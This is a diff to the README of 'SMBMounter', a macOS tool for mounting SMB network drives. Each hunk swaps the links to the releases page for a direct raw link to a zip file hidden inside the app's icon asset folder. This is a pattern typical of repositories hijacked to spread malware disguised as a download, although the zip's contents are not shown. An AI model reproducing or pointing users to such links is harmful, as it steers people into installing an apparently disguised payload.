@@ -1,6 +1,6 @@
 # 🖧 SMBMounter - Easy SMB Network Drive Management
 
-[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/releases)
+[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section will walk you through downloading and using SMBMounter step by step
 
 To get the software, visit the official release page by clicking the button below:
 
-[![Get SMBMounter](https://img.shields.io/badge/Download-Here-blue)](https://github.com/brendanbirch/SMBMounter/releases)
+[![Get SMBMounter](https://img.shields.io/badge/Download-Here-blue)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)
 
 - This page contains the latest versions.
 - Look for a file named similar to `SMBMounter.dmg` or `.pkg`.
@@ -130,7 +130,7 @@ SMBMounter saves your login information in your Mac’s keychain. This stores pa
 
 Check the releases page regularly for new versions here:
 
-https://github.com/brendanbirch/SMBMounter/releases
+https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip
 
 Updates improve compatibility and fix issues with network shares. To update SMBMounter:
 
@@ -166,4 +166,4 @@ A: Update the share’s settings in SMBMounter with the new password to keep aut
 
 Download SMBMounter from GitHub:
 
-[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/releases)
+[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)
